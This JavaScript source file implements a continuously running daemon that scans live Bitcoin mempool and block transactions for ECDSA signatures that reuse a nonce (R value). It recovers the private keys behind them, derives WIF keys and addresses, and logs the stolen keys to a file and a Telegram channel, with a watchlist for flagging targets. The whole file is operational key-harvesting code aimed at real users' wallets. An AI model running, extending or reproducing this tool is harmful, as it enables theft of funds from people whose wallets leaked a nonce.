import { WebSocket } from "ws";
import { CONFIG, DEFAULT_API } from "../config.js";
import { padHex, hexToBytes, bytesToHex } from "../bytes.js";
import { secp256k1, hash160 } from "../hash.js";
import { c, C, ICON, banner, header, kv, sep, box } from "../ui.js";
import { p2pkhAddress, p2wpkhAddress, toWIF } from "../address.js";
import { recoverPrivateKey } from "../ecdsa.js";
import { esploraFetch, sleep, REQ_STATS, reqRatePerSec } from "../net.js";
import { notifyTelegram } from "../telegram.js";
import {
  LRUSet, SEEN_FILE, loadSeenSnapshot, saveSeenSnapshot,
  loadWatchlist, appendHit, _hitsStreams,
} from "../cache.js";
import { PROFILE, profReport } from "../profile.js";
import {
  processTxAllInputs, runWithConcurrency,
} from "../analysis.js";

export async function runDaemon(opts = {}) {
  const base        = opts.api || DEFAULT_API;
  const mode        = opts.mode || "mempool";
  const limitPerCycle = Math.max(1, opts.limit || 200);
  const intervalSec = Math.max(10, opts.interval || 60);
  const hitsFile    = opts.hitsFile || CONFIG.hitsFile;
  const concurrency = opts.concurrency || CONFIG.concurrency;
  const realtime    = opts.realtime != null ? !!opts.realtime : !!(CONFIG.daemon && CONFIG.daemon.realtime);
  const seenLimit   = (CONFIG.daemon && CONFIG.daemon.seenLimit) || 200_000;
  const poolMaxAgeMs = ((CONFIG.daemon && CONFIG.daemon.poolMaxAgeHours) || 24) * 3600 * 1000;
  const watchlist   = loadWatchlist(opts.watchFile);
  const SAVE_SEEN_EVERY = 5;

  const seenTxids = new LRUSet(seenLimit);
  const sigPool   = [];
  let cycle = 0, totalTx = 0, totalSigs = 0, totalHits = 0;
  let running = true;

  const snap = loadSeenSnapshot(48);
  if (snap && snap.length) {
    for (const id of snap) seenTxids.add(id);
    console.log("  " + ICON.info + c(C.cyan, " Restore seenTxids dari snapshot: " + snap.length + " txid"));
  }

  let ws = null;
  let wsKick = null;
  let wsConnected = false;
  let wsReconnectAttempt = 0;
  let wsReconnectTimer = null;
  function setupWebSocket() {
    if (!realtime) return;
    if (wsReconnectTimer) { clearTimeout(wsReconnectTimer); wsReconnectTimer = null; }
    try {
      const wsUrl = base.replace(/^http/i, "ws").replace(/\/api\/?$/, "") + "/api/v1/ws";
      ws = new WebSocket(wsUrl);
      ws.on("open", () => {
        wsConnected = true;
        wsReconnectAttempt = 0;
        try {
          ws.send(JSON.stringify({ action: "want", data: ["blocks", "mempool-blocks", "stats"] }));
        } catch {}
      });
      ws.on("message", () => { if (wsKick) { const k = wsKick; wsKick = null; k(); } });
      ws.on("close", () => {
        wsConnected = false;
        if (!running) return;
        wsReconnectAttempt++;
        const exp = Math.min(30_000, 1000 * 2 ** Math.min(wsReconnectAttempt - 1, 5));
        const wait = Math.floor(exp * (0.5 + Math.random() * 0.5));
        wsReconnectTimer = setTimeout(setupWebSocket, wait);
      });
      ws.on("error", () => {});
    } catch {}
  }
  setupWebSocket();

  process.on("SIGINT",  () => { running = false; if (wsKick) { const k = wsKick; wsKick = null; k(); } });
  process.on("SIGTERM", () => { running = false; if (wsKick) { const k = wsKick; wsKick = null; k(); } });

  console.log();
  banner();
  console.log();
  header(
    "Mode Daemon — Scan Otomatis Berkelanjutan",
    "Tekan Ctrl+C untuk berhenti"
  );
  kv("Sumber",    mode === "mempool" ? "Mempool (unconfirmed)" : "Blok terbaru", C.cyan);
  kv("Interval",  intervalSec + " detik per siklus", C.white);
  kv("Maks TX",   limitPerCycle + " tx per siklus", C.white);
  kv("Paralel",   concurrency + " request", C.dim);
  kv("Realtime",  realtime ? "WebSocket aktif (mempool.space)" : "Polling biasa", realtime ? C.green : C.dim);
  if (watchlist) kv("Watchlist", opts.watchFile + " (" + watchlist.size + " address)", C.bold + C.yellow);
  if (PROFILE.enabled) kv("Profile",  "AKTIF (timing per fase)", C.cyan);
  kv("API",       base, C.dim);
  kv("Hits file", hitsFile, C.dim);
  console.log();
  sep("Daemon dimulai · " + new Date().toLocaleString("id-ID"));
  console.log();

  while (running) {
    cycle++;
    const cycleStart = Date.now();

    let freshTxids = [];
    try {
      if (mode === "mempool") {
        const all = await esploraFetch(base, "/mempool/txids");
        if (Array.isArray(all)) freshTxids = all.filter((id) => !seenTxids.has(id)).slice(0, limitPerCycle);
      } else {
        const blocks = await esploraFetch(base, "/blocks");
        const blkList = (blocks || []).slice(0, Math.max(1, Math.min(10, concurrency)));
        const blkTxids = new Array(blkList.length);
        await runWithConcurrency(blkList, concurrency, async (blk, idx) => {
          try { blkTxids[idx] = await esploraFetch(base, "/block/" + blk.id + "/txids"); }
          catch { blkTxids[idx] = null; }
        }, null);
        outer: for (const tids of blkTxids) {
          if (!Array.isArray(tids)) continue;
          for (const id of tids) {
            if (!seenTxids.has(id)) freshTxids.push(id);
            if (freshTxids.length >= limitPerCycle) break outer;
          }
        }
      }
    } catch (e) {
      console.log("  " + ICON.err + " " + c(C.red, "Siklus " + cycle + " gagal ambil txids: " + e.message));
      await sleep(intervalSec * 1000);
      continue;
    }

    if (freshTxids.length === 0) {
      console.log("  " + ICON.info + c(C.dim, " Siklus " + cycle + " — tidak ada tx baru, tunggu " + intervalSec + "s…"));
      await sleep(intervalSec * 1000);
      continue;
    }

    process.stdout.write(
      c(C.yellow + C.bold, "  ❯ Siklus #" + cycle) +
      c(C.dim, "  " + freshTxids.length + " tx baru  ·  pool=" + sigPool.length + " sig  ·  " + new Date().toLocaleTimeString("id-ID")) + "\n"
    );

    const metas = [];
    await runWithConcurrency(freshTxids, concurrency, async (txid) => {
      try { metas.push(await esploraFetch(base, "/tx/" + txid)); } catch {}
    }, null);

    const cycleSigs = [];
    await runWithConcurrency(metas, concurrency, async (tx) => {
      const r = await processTxAllInputs(tx, base);
      for (const s of r.sigs) cycleSigs.push(s);
    }, null);

    for (const id of freshTxids) seenTxids.add(id);

    totalTx   += freshTxids.length;
    totalSigs += cycleSigs.length;

    if (poolMaxAgeMs > 0 && sigPool.length) {
      const cutoff = Date.now() - poolMaxAgeMs;
      let drop = 0;
      while (drop < sigPool.length && (sigPool[drop]._t || 0) < cutoff) drop++;
      if (drop > 0) sigPool.splice(0, drop);
    }

    const nowTs = Date.now();
    for (const s of cycleSigs) {
      s.index = sigPool.length;
      s._t = nowTs;
      sigPool.push(s);
    }

    const elapsed = ((Date.now() - cycleStart) / 1000).toFixed(1);
    console.log(
      "    " + ICON.ok + " " + c(C.green, cycleSigs.length + " sig") +
      c(C.dim, " dari " + metas.length + " tx  (" + elapsed + "s)") +
      c(C.dim, "  │  total pool: " + sigPool.length + " sig")
    );

    if (sigPool.length >= 2) {
      const groups = new Map();
      for (const s of sigPool) {
        const k = padHex(s.r);
        if (!groups.has(k)) groups.set(k, []);
        groups.get(k).push(s);
      }
      for (const [r, list] of groups) {
        if (list.length < 2) continue;
        const freshSet = new Set(cycleSigs.map((s) => s.txid));
        const hasNew = list.some((s) => freshSet.has(s.txid));
        if (!hasNew) continue;

        const hitWatch = watchlist ? list.some((s) => s.address && watchlist.has(s.address)) : false;

        totalHits++;
        console.log();
        const tag = hitWatch ? " [WATCHLIST!]" : "";
        const titleColor = hitWatch ? (C.bgRed + C.white + C.bold) : (C.red + C.bold);
        console.log(c(titleColor, "  " + ICON.alert + " R-REUSE DITEMUKAN!" + tag + " (siklus #" + cycle + ")"));
        console.log(c(C.dim, "  R = " + r.slice(0, 32) + "…"));
        for (const s of list.slice(0, 4)) {
          const addrCol = (watchlist && s.address && watchlist.has(s.address)) ? C.yellow + C.bold : C.dim;
          console.log(c(C.dim, "    tx " + (s.txid || "?").slice(0, 20) + "…  input#" + s.inputIndex + "  ") + c(addrCol, s.address || ""));
        }

        const a = list[0], b = list[1];
        if (a.z != null && b.z != null) {
          const cands = recoverPrivateKey(a.r, a.s, a.z, b.s, b.z);
          for (const { k: kVal, d } of cands) {
            try {
              const dHex = padHex(d);
              const pubC = secp256k1.getPublicKey(hexToBytes(dHex), true);
              const pubU = secp256k1.getPublicKey(hexToBytes(dHex), false);
              const pubCHex = bytesToHex(pubC);
              const pubUHex = bytesToHex(pubU);
              if (pubCHex === a.pubkey || pubUHex === a.pubkey || pubCHex === b.pubkey || pubUHex === b.pubkey) {
                const h160 = hash160(pubC);
                const addrC = p2pkhAddress(h160);
                const addrS = p2wpkhAddress(h160);
                const wif   = toWIF(d, 0x80, true);
                box(ICON.key + "  PRIVATE KEY DIPULIHKAN  (daemon siklus #" + cycle + ")", [
                  c(C.dim, "Priv (hex)    ") + c(C.green + C.bold, dHex),
                  c(C.dim, "WIF           ") + c(C.green, wif),
                  c(C.dim, "Addr P2PKH    ") + c(C.green + C.bold, addrC),
                  c(C.dim, "Addr P2WPKH   ") + c(C.green + C.bold, addrS),
                  c(C.dim, "R (nonce)     ") + c(C.yellow, r.slice(0, 32) + "…"),
                ], C.green);

                try {
                  const ts = new Date().toISOString();
                  const line = [
                    "=== DAEMON HIT ===",
                    "Waktu     : " + ts, "Siklus    : #" + cycle,
                    "Priv (hex): " + dHex, "WIF       : " + wif,
                    "Addr P2PKH: " + addrC, "Addr bc1  : " + addrS,
                    "R nonce   : " + r, "",
                  ].join("\n");
                  appendHit(hitsFile, line);
                } catch {}

                if (CONFIG.telegram.enabled) {
                  notifyTelegram([
                    (hitWatch ? "🚨🚨 *WATCHLIST HIT!* " : "🚨 ") + "*DAEMON R-REUSE HIT* (siklus #" + cycle + ")",
                    "Priv: `" + dHex + "`",
                    "WIF : `" + wif + "`",
                    "P2PKH: `" + addrC + "`",
                    "bc1  : `" + addrS + "`",
                  ].join("\n")).catch(() => {});
                }
                break;
              }
            } catch {}
          }
        }
        console.log();
      }
    }

    const memMB = (process.memoryUsage().rss / 1024 / 1024).toFixed(0);
    const rps = reqRatePerSec().toFixed(1);
    console.log(c(C.gray,
      "    Total: siklus=" + cycle + "  tx=" + totalTx +
      "  sig=" + totalSigs + "  hit=" + totalHits +
      "  pool=" + sigPool.length + "  seen=" + seenTxids.size +
      "  mem=" + memMB + "MB  req/s=" + rps
    ));

    if (cycle % SAVE_SEEN_EVERY === 0) saveSeenSnapshot(seenTxids);

    if (running) {
      const wsTag = realtime && wsConnected ? " [ws]" : "";
      const waitMsg = "  Menunggu " + intervalSec + "s sampai siklus berikutnya…" + wsTag + " (Ctrl+C untuk berhenti)";
      process.stdout.write(c(C.dim, waitMsg));
      const totalMs = intervalSec * 1000;
      const start = Date.now();
      const kickPromise = new Promise((res) => { wsKick = res; });
      const tick = async () => {
        while (running) {
          const elapsed = Date.now() - start;
          if (elapsed >= totalMs) return;
          const rem = Math.max(0, Math.ceil((totalMs - elapsed) / 1000));
          process.stdout.write("\r" + c(C.dim, waitMsg.replace("Menunggu " + intervalSec + "s", "Menunggu " + rem + "s ")) + "\x1b[K");
          await sleep(Math.min(1000, totalMs - elapsed));
        }
      };
      await Promise.race([tick(), kickPromise]);
      wsKick = null;
      process.stdout.write("\r\x1b[K");
    }
  }

  saveSeenSnapshot(seenTxids);
  if (wsReconnectTimer) { clearTimeout(wsReconnectTimer); wsReconnectTimer = null; }
  if (ws) { try { ws.removeAllListeners(); ws.close(); } catch {} }
  for (const s of _hitsStreams.values()) { try { s.end(); } catch {} }
  _hitsStreams.clear();

  console.log();
  sep("Daemon dihentikan · " + new Date().toLocaleString("id-ID"));
  kv("Total siklus", String(cycle), C.white);
  kv("Total tx",     String(totalTx), C.cyan);
  kv("Total sig",    String(totalSigs), C.cyan);
  kv("Total hit",    String(totalHits), totalHits > 0 ? C.green : C.dim);
  kv("Total req",    String(REQ_STATS.total), C.dim);
  kv("Snapshot",     SEEN_FILE + " (" + seenTxids.size + " txid)", C.dim);
  console.log();
  profReport();
}
